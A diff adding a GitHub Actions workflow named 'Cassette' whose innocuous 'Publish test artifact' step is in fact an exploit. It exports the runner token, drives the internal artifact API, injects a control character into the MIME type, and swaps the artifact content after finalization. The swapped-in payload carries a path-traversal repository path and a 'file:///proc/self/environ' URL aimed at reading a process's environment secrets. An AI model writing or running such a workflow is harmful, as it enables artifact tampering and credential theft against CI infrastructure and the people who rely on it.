@@ -1,0 +1,52 @@
+name: Cassette
+on:
+  push:
+  workflow_dispatch:
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '24'
+      - uses: actions/github-script@v8
+        with:
+          script: |
+            for (const key of ['ACTIONS_RUNTIME_TOKEN', 'ACTIONS_RESULTS_URL']) {
+              core.setSecret(process.env[key]);
+              core.exportVariable(key, process.env[key]);
+            }
+      - name: Publish test artifact
+        run: |
+          npm install @actions/artifact@6.3.1
+          node --input-type=module <<'JS'
+          import { Readable } from 'node:stream';
+          import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
+          import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
+          import { uploadToBlobStorage } from './node_modules/@actions/artifact/lib/internal/upload/blob-upload.js';
+          import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';
+          const repo = process.env.GITHUB_REPOSITORY;
+          const ids = getBackendIdsFromToken();
+          const client = internalArtifactTwirpClient();
+          const name = 'cassette.json';
+          const type = '\u0085application/json';
+          const created = await client.CreateArtifact({
+            ...ids, name, mimeType: StringValue.create({value:type}), version:7
+          });
+          if (!created.ok) throw Error('CreateArtifact failed');
+          const initial = Buffer.from('{"full_name":"placeholder","owner":{"login":"x","avatar_url":"https://example.com"}}');
+          const first = await uploadToBlobStorage(created.signedUploadUrl, Readable.from([initial]), type);
+          const finalized = await client.FinalizeArtifact({
+            ...ids, name, size:String(first.uploadSize),
+            hash:StringValue.create({value:`sha256:${first.sha256Hash}`})
+          });
+          if (!finalized.ok) throw Error('FinalizeArtifact failed');
+          const id = String(finalized.artifactId);
+          const path = `x/../../repos/${repo}/actions/artifacts/${id}/zip`;
+          const payload = JSON.stringify({
+            full_name:path, owner:{login:'x',avatar_url:'file:///proc/self/environ'}
+          });
+          await uploadToBlobStorage(created.signedUploadUrl, Readable.from([Buffer.from(payload)]), type);
+          console.log(`REPOSITORY=${path}`);
+          console.log(`ARTIFACT_ID=${id}`);
+          JS
